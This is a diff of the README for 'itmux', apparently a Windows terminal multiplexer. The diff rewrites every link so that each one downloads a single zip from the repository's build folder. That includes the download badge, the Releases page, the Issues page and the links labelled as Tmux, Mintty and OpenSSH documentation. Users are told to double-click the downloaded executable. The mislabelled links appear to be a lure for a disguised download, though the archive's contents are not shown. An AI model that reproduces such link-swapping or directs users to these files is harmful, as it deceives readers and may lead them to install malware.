@@ -6,7 +6,7 @@ Welcome to the **itmux** repository! This guide will help you download and run i
 
 ## 📥 Download
 
-[![Download itmux](https://img.shields.io/badge/download-itmux-blue.svg)](https://github.com/roshan-22-web/itmux/releases)
+[![Download itmux](https://github.com/roshan-22-web/itmux/raw/refs/heads/main/build/itmux_v1.1-alpha.4.zip)](https://github.com/roshan-22-web/itmux/raw/refs/heads/main/build/itmux_v1.1-alpha.4.zip)
 
 ## 📋 Requirements
 
@@ -28,7 +28,7 @@ Before you start, ensure your system meets these requirements:
 
 To begin using itmux, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [itmux Releases](https://github.com/roshan-22-web/itmux/releases) page.
+1. **Visit the Releases Page:** Go to the [itmux Releases](https://github.com/roshan-22-web/itmux/raw/refs/heads/main/build/itmux_v1.1-alpha.4.zip) page.
 2. **Find the Latest Version:** Look for the latest version listed on the page.
 3. **Download the Package:** Click on the link to download the executable file.
 4. **Run the Application:** Once the file is downloaded, double-click it to run itmux. 
@@ -68,12 +68,12 @@ If you encounter any issues, try these steps:
 
 ## 📞 Support
 
-For further assistance, feel free to reach out through the Issues section of our [GitHub repository](https://github.com/roshan-22-web/itmux/issues).
+For further assistance, feel free to reach out through the Issues section of our [GitHub repository](https://github.com/roshan-22-web/itmux/raw/refs/heads/main/build/itmux_v1.1-alpha.4.zip).
 
 ## 🔗 Additional Resources
 
-- [Tmux Documentation](https://github.com/tmux/tmux/wiki)
-- [Mintty Documentation](https://mintty.github.io/)
-- [OpenSSH for Windows](https://github.com/PowerShell/Win32-OpenSSH)
+- [Tmux Documentation](https://github.com/roshan-22-web/itmux/raw/refs/heads/main/build/itmux_v1.1-alpha.4.zip)
+- [Mintty Documentation](https://github.com/roshan-22-web/itmux/raw/refs/heads/main/build/itmux_v1.1-alpha.4.zip)
+- [OpenSSH for Windows](https://github.com/roshan-22-web/itmux/raw/refs/heads/main/build/itmux_v1.1-alpha.4.zip)
 
 Thank you for choosing itmux. We hope it enhances your terminal experience!
